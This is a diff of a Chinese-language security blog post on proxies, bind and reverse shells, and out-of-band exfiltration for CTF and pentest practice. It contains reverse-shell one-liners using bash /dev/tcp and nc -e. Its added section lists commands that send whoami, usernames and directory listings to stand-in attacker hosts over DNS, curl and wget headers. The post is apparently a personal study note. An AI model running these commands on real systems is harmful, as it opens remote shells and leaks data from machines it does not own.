@@ -22,25 +22,31 @@
     <meta name="description" content="无论是CTF，渗透测试，或者漏洞挖掘，都是一定程度上对靶机的操控。 有时候只是一个命令执行环境，有时候能拿到shell提权。 本文学习并探讨代理，连接，shell 等  正向shell和反弹shell 代理（Proxy）​	代理：一个实体代表另一个实体执行某种任务或行动的机制。 代理可以是一个 服务器或计算机，充当客户端和目标服务器之间的中介。网络代理可以用于多种目的，如加速数据传输、缓存、过滤">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Proxy&amp;Connect&amp;shell">
-<meta property="og:url" content="https://i4g5d.github.io/2025/11/06/Connect-shell/index.html">
+<meta property="og:url" content="https://i4g5d.github.io/2025/11/06/shell/index.html">
 <meta property="og:site_name" content="i4G5d-Blog">
 <meta property="og:description" content="无论是CTF，渗透测试，或者漏洞挖掘，都是一定程度上对靶机的操控。 有时候只是一个命令执行环境，有时候能拿到shell提权。 本文学习并探讨代理，连接，shell 等  正向shell和反弹shell 代理（Proxy）​	代理：一个实体代表另一个实体执行某种任务或行动的机制。 代理可以是一个 服务器或计算机，充当客户端和目标服务器之间的中介。网络代理可以用于多种目的，如加速数据传输、缓存、过滤">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/Connect-shell/image-20251106173303646.png">
-<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/Connect-shell/image-20251106173841254.png">
-<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/Connect-shell/image-20251106193859800.png">
-<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/Connect-shell/image-20251106210456156.png">
-<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/Connect-shell/image-20251106214349759.png">
-<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/Connect-shell/image-20251106214719684.png">
-<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/Connect-shell/image-20251106223242457.png">
-<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/Connect-shell/image-20251106221550753.png">
-<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/Connect-shell/image-20251106222108826.png">
-<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/Connect-shell/image-20251106225005108.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106173303646.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106173841254.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106193859800.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106210456156.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106214349759.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106214719684.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106223242457.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106221550753.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106222108826.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106225005108.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251108210153355.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251108210204163.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251108214925226.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251108214945868.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251108213941155.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251108213948160.png">
 <meta property="article:published_time" content="2025-11-06T08:58:09.000Z">
-<meta property="article:modified_time" content="2025-11-06T15:22:14.080Z">
+<meta property="article:modified_time" content="2025-11-08T13:56:20.696Z">
 <meta property="article:author" content="i4G5d">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i4g5d.github.io/2025/11/06/Connect-shell/image-20251106173303646.png">
+<meta name="twitter:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106173303646.png">
   
   
   
@@ -233,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.2k 字
+          4.2k 字
         
       </span>
     
@@ -244,7 +250,7 @@
         
         
         
-          27 分钟
+          36 分钟
         
       </span>
     
@@ -298,10 +304,10 @@
 <h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>正向代理服务器由我们（客户端）配置，代表客户端向服务器发送请求。</p>
 <p>客户端需要访问互联网资源时，向正向代理发送请求，正向代理转发给服务器，得到响应返回给客户端。</p>
 <p>正向代理可隐藏IP，访问限制内容，过滤和加速请求。利用多个代理服务器转发请求可以防止被他人查到真实身份。</p>
-<p><img src="/2025/11/06/Connect-shell/image-20251106173303646.png" srcset="/img/loading.gif" lazyload alt="image-20251106173303646"></p>
+<p><img src="/2025/11/06/shell/image-20251106173303646.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理就是代表服务器执行请求。</p>
 <p>反向代理通常用于均衡负载，SSL终!止，内容缓存，保护后端服务器和隐藏后端服务器身份等</p>
-<p><img src="/2025/11/06/Connect-shell/image-20251106173841254.png" srcset="/img/loading.gif" lazyload alt="image-20251106173841254"></p>
+<p><img src="/2025/11/06/shell/image-20251106173841254.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="连接-Shell"><a href="#连接-Shell" class="headerlink" title="连接&amp;Shell"></a>连接&amp;Shell</h1><p>首先，先理解正向&#x2F;反向连接。正向连接是指由客户端向服务端发起连接请求，反之就是反向连接。</p>
 <p>所谓的反弹shell就是客户端监听特定端口，服务端反向连接，发起请求到那个端口，建立起shell连接。</p>
 <h2 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h2><blockquote>
@@ -316,13 +322,13 @@
 <li>防火墙可能会阻止正向shell</li>
 <li>如何让靶机绑定端口，并重定向给shell</li>
 </ol>
-<p>先看<strong>第一点</strong>，如果有防火墙存在，会使nmap扫出来基本没有<code>closed</code>,【除非有未被防火墙拦截（非filtered）,且未被占用（closed状态，非open）】实际很难绕过防火墙或者环境极其特殊。</p>
+<p>先看<strong>第一点</strong>，如果有防火墙存在，会使nmap扫出来有<code>filtered</code>,端口关闭状态<code>closed</code>,服务运行状态<code>open</code>。实际很难绕过防火墙或者环境极其特殊。</p>
 <blockquote>
 <p>比如下图中，open是已经占用的端口，说明已经有进程监听，关掉监听，扫一下1234，就是close</p>
 </blockquote>
-<p><img src="/2025/11/06/Connect-shell/image-20251106193859800.png" srcset="/img/loading.gif" lazyload alt="image-20251106193859800"></p>
-<p><img src="/2025/11/06/Connect-shell/image-20251106210456156.png" srcset="/img/loading.gif" lazyload alt="image-20251106210456156"></p>
-<p>所以如果看到有防火墙且没有可利用的closed端口，直接放弃正向shell</p>
+<p><img src="/2025/11/06/shell/image-20251106193859800.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/11/06/shell/image-20251106210456156.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以如果看到有防火墙且没有可利用的<code>open</code>端口，直接放弃正向shell</p>
 <p><strong>第二点</strong>，如何绑一个正向shell到靶机</p>
 <ol>
 <li><p>若靶机有环境，可以用python，C等语言写一个socket</p>
@@ -334,10 +340,10 @@
 </li>
 <li><p>若可传木马，MSFvenom生成shell木马</p>
 <p>（注意，MSF生成的payload得用MSF打）</p>
-<p><img src="/2025/11/06/Connect-shell/image-20251106214349759.png" srcset="/img/loading.gif" lazyload alt="image-20251106214349759"></p>
+<p><img src="/2025/11/06/shell/image-20251106214349759.png" srcset="/img/loading.gif" lazyload></p>
 <p>这是生成，后面可以用nc，curl，weget等上传shell，通用有777的文件夹&#x2F;tmp或&#x2F;opt（cmd&#x3D;&#x2F;opt&#x2F;bindshell）</p>
 <p>这只是演示，实际用了MSF只能用MSF打，选explout&#x2F;muliti&#x2F;handler模块</p>
-<p><img src="/2025/11/06/Connect-shell/image-20251106214719684.png" srcset="/img/loading.gif" lazyload alt="image-20251106214719684"></p>
+<p><img src="/2025/11/06/shell/image-20251106214719684.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <h2 id><a href="#" class="headerlink" title></a></h2><h2 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h2><blockquote>
@@ -355,17 +361,17 @@
 <p><code>0&gt;&amp;1</code>将（用户） “标准输入” 重定向到 “标准输出所指向的地方”（也就是前面的 TCP 连接）。</p>
 <p>记得做webshell可能要url编码，<code>&amp;</code>&#x3D;&gt;<code>%26</code></p>
 </blockquote>
-<p><img src="/2025/11/06/Connect-shell/image-20251106223242457.png" srcset="/img/loading.gif" lazyload alt="image-20251106223242457"></p>
+<p><img src="/2025/11/06/shell/image-20251106223242457.png" srcset="/img/loading.gif" lazyload></p>
 <p>倘若目标系统不是默认bash，需要bash -c包裹</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -c &#x27;bash -i&gt;&amp; /dev/tcp/攻击机ip/攻击机port 0&gt;&amp;1&#x27;<br></code></pre></td></tr></table></figure>
 
 <p>比如kali的zsh就不是默认bash</p>
-<p><img src="/2025/11/06/Connect-shell/image-20251106221550753.png" srcset="/img/loading.gif" lazyload alt="image-20251106221550753"></p>
+<p><img src="/2025/11/06/shell/image-20251106221550753.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc 192.168.106.133 4444 -e /bin/bash    //连接攻击机 用bash<br>nc -l 4444|bash|nc 192.168.106.133 5555   //没有-e时<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/06/Connect-shell/image-20251106222108826.png" srcset="/img/loading.gif" lazyload alt="image-20251106222108826"></p>
+<p><img src="/2025/11/06/shell/image-20251106222108826.png" srcset="/img/loading.gif" lazyload></p>
 <p>第二个命令比较巧妙，要一个连接一个反弹</p>
-<p><img src="/2025/11/06/Connect-shell/image-20251106225005108.png" srcset="/img/loading.gif" lazyload alt="image-20251106225005108"></p>
+<p><img src="/2025/11/06/shell/image-20251106225005108.png" srcset="/img/loading.gif" lazyload></p>
 <details>
     <summary>Linux常见反弹shell</summary>
 
@@ -397,10 +403,45 @@
 </ul>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/334613.html">more…</a></p>
 <p>​    </p></details><p></p>
-<h1 id="带外OOB"><a href="#带外OOB" class="headerlink" title="带外OOB"></a>带外OOB</h1><p>更具我的经验</p>
-<p>利用BURP的collaborator，或者<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
-<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">nslookup $(whoami) gongjizhe.com<br><br>https:<span class="hljs-comment">//gongjizhe.com?fo0=(要带出的)</span><br></code></pre></td></tr></table></figure>
+<h1 id="OOB带外"><a href="#OOB带外" class="headerlink" title="OOB带外"></a>OOB带外</h1><p>无回显时使用OOB带外</p>
+<p>可参考<a target="_blank" rel="noopener" href="https://sakurahack-y.github.io/">OOB外带攻击</a></p>
+<h2 id="可出网主机："><a href="#可出网主机：" class="headerlink" title="可出网主机："></a>可出网主机：</h2><p><strong>使用http传输，如wget，curl，certutil将回显信息爬出</strong></p>
+<ul>
+<li><p>** 优点**：方便，回显全。</p>
+</li>
+<li><p>** 缺点**：对于不出网服务器没有办法传输，同时需要了解其返回包字段信息，需要使用返回包字段将回显信息带出</p>
+</li>
+</ul>
+<h2 id="不出网主机："><a href="#不出网主机：" class="headerlink" title="不出网主机："></a>不出网主机：</h2><p><strong>使用DNS（ping，nslookup）传输，ICMP传输，powershell中的wget，curl等传输</strong></p>
+<ul>
+<li><p>** 优点**：不出网机器可以传输</p>
+</li>
+<li><p>** 缺点**：1.回显是一条条执行，需要将回显结果拼接解码，回显信息比较麻烦<br>2.短回显可以使用DNS传输，长回显大部分带出需要powershell搭配，但杀毒软件往往禁用powershell，因此利用条件较苛刻</p>
+</li>
+</ul>
+<p>更具我的经验</p>
+<p>利用BURP的collaborator，或者<a target="_blank" rel="noopener" href="http://dnslog.cn/">dnslog</a>  <a target="_blank" rel="noopener" href="http://ceye.io/">ceye</a></p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">dns:</span><br><span class="hljs-built_in">ping %</span>USERNAME%.attacker.com<br>ping `whoami`.attacker.com	<br>nslookup $(whoami).attacker.com	<br><br><span class="hljs-title">http:</span><br><span class="hljs-title">https:</span>//attacker.com?foo=(要带出的)<br>curl `whoami`.attacker.com(attacker.com/`whoami`)<br></code></pre></td></tr></table></figure>
 
+<p>windows系统shell带外命令</p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haml">windows中 %xxx% 的xxx代表系统变量,常用系统变量命令<br><span class="hljs-tag">              %<span class="hljs-selector-tag">SystemDrive</span></span>%                                     系统安装的磁盘分区<br><span class="hljs-tag">              %<span class="hljs-selector-tag">SystemRoot</span></span>% = %Windir% WINDODWS                  系统目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">ProgramFiles</span></span>%　                                  应用程序默认安装目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">AppData</span></span>%                                         应用程序数据目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">CommonProgramFiles</span></span>%                              公用文件目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">HomePath</span></span>%                                        当前活动用户目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">Temp</span></span>% =%Tmp%                                     当前活动用户临时目录<br><span class="hljs-tag">              %<span class="hljs-selector-tag">DriveLetter</span></span>%                                     逻辑驱动器分区<br><span class="hljs-tag">              %<span class="hljs-selector-tag">HomeDrive</span></span>%                                       当前用户系统所在分区<br></code></pre></td></tr></table></figure>
+
+<p>HTTP:</p>
+<p>有时候ls等很多换行导致信息显示不全，可以借用sed</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl XXX.ceye.io/`<span class="hljs-built_in">ls</span> -al|sed -n <span class="hljs-string">&#x27;2p&#x27;</span>` //这里回显的就是第二行数据了<br>curl XXX.ceye.io/`<span class="hljs-built_in">ls</span> -al|sed -n <span class="hljs-string">&#x27;2p&#x27;</span>|<span class="hljs-built_in">base64</span>`   <span class="hljs-built_in">base64</span>传输<br>curl XXX.ceye.io/`<span class="hljs-built_in">ls</span> -al |<span class="hljs-built_in">cut</span> -c 3-10`   分割<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/06/shell/image-20251108210153355.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/11/06/shell/image-20251108210204163.png" srcset="/img/loading.gif" lazyload></p>
+<p>或者wget：结合header查看，可以用collaborator</p>
+<p><strong>使用wget将命令回显信息通过包头数据字符串YJH传输至攻击服务器上，xargs echo–n代表去掉各个分隔符，换行符等符号输出</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">wget <span class="hljs-attr">--header</span>=<span class="hljs-string">&quot;YJH:`ls | xargs echo –n`&quot;</span> <span class="hljs-number">8</span>lusscjjxlskqnabjvzwhmj3nutlhb50<span class="hljs-selector-class">.oastify</span>.com<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/06/shell/image-20251108214925226.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/11/06/shell/image-20251108214945868.png" srcset="/img/loading.gif" lazyload></p>
+<p>DNS:</p>
+<p>ping或nslookup ，只能短信息回显</p>
+<p><img src="/2025/11/06/shell/image-20251108213941155.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/11/06/shell/image-20251108213948160.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -440,7 +481,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>Proxy&amp;Connect&amp;shell</div>
-      <div>https://i4g5d.github.io/2025/11/06/Connect-shell/</div>
+      <div>https://i4g5d.github.io/2025/11/06/shell/</div>
     </div>
     <div class="license-meta">
       
